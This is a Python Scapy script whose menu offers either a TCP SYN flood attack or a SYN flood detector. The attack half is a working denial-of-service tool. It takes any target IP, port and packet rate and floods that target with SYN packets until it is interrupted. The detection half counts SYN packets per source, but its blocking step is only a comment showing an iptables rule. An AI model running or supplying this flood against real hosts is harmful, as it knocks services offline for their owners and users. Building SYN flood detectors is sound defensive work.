import logging  # Import the logging library for better control over log messages
import scapy.all as scapy  # Import all functions from Scapy for packet manipulation
import time  # Import the time library for rate-limiting
from threading import Thread  # Import Thread class for multi-threading
from collections import Counter  # Import Counter class for detecting anomalies

# Configure logging settings
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_syn_flood(target_ip, target_port, rate_limit):
    """
    Send TCP SYN packets to the target IP address and port at a specified rate.
    :param target_ip: The IP address of the target machine.
    :param target_port: The port of the target machine.
    :param rate_limit: The number of packets to send per second.
    """
    packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=target_port, flags='S')  # Construct a TCP SYN packet with the target IP and port
    interval = 1.0 / rate_limit  # Calculate the interval between packets based on the rate limit
    logging.info(f"Starting TCP SYN Flood attack on {target_ip}:{target_port} with a rate limit of {rate_limit} packets/second")

    while True:
        try:
            scapy.send(packet, verbose=False)  # Send the TCP SYN packet without verbose output
            time.sleep(interval)  # Wait for the specified interval before sending the next packet
        except KeyboardInterrupt:
            logging.info("Attack stopped by user")
            break

def start_attack():
    """
    Prompt the user for target IP, target port, and rate limit, then start the TCP SYN flood attack.
    """
    target_ip = input("Enter the target IP address: ")  # Prompt the user to input the target IP address
    target_port = int(input("Enter the target port: "))  # Prompt the user to input the target port
    rate_limit = int(input("Enter the rate limit (packets per second): "))  # Prompt the user to input the rate limit

    attack_thread = Thread(target=send_syn_flood, args=(target_ip, target_port, rate_limit))  # Create a new thread for the attack
    attack_thread.start()  # Start the attack thread

# Detection and Mitigation

def detect_syn_flood(interface, threshold):
    """
    Detect SYN flood attacks by monitoring the number of SYN packets on the specified interface.
    :param interface: The network interface to monitor.
    :param threshold: The number of SYN packets per second that indicates a possible SYN flood.
    """
    syn_counter = Counter()  # Create a Counter to track SYN packets

    def process_packet(packet):
        if packet.haslayer(scapy.TCP) and packet[scapy.TCP].flags == 'S':  # Check if the packet is a TCP SYN packet
            syn_counter[packet[scapy.IP].src] += 1  # Increment the counter for the source IP address

    def reset_counter():
        while True:
            time.sleep(1)  # Reset the counter every second
            for ip, count in syn_counter.items():
                if count > threshold:
                    logging.warning(f"Potential SYN flood detected from {ip}: {count} SYN packets in the last second")
                    mitigate_syn_flood(ip)
            syn_counter.clear()  # Clear the counter for the next second

    sniff_thread = Thread(target=scapy.sniff, kwargs={'iface': interface, 'store': False, 'prn': process_packet})  # Create a new thread for packet sniffing
    sniff_thread.start()  # Start the sniffing thread
    reset_thread = Thread(target=reset_counter)  # Create a new thread for resetting the counter
    reset_thread.start()  # Start the reset thread

def mitigate_syn_flood(ip):
    """
    Mitigate SYN flood attacks by blocking the source IP address.
    :param ip: The IP address to block.
    """
    logging.info(f"Blocking IP address {ip}")
    # Implement the blocking mechanism here (e.g., using iptables, firewall rules, etc.)
    # Example: iptables -A INPUT -s {ip} -j DROP

if __name__ == "__main__":
    choice = input("Do you want to (1) Start Attack or (2) Detect and Mitigate SYN Flood? Enter 1 or 2: ")
    if choice == '1':
        start_attack()  # Start the attack when the script is executed
    elif choice == '2':
        interface = input("Enter the network interface to monitor (e.g., eth0): ")
        threshold = int(input("Enter the SYN packet threshold per second: "))
        detect_syn_flood(interface, threshold)  # Start detection and mitigation
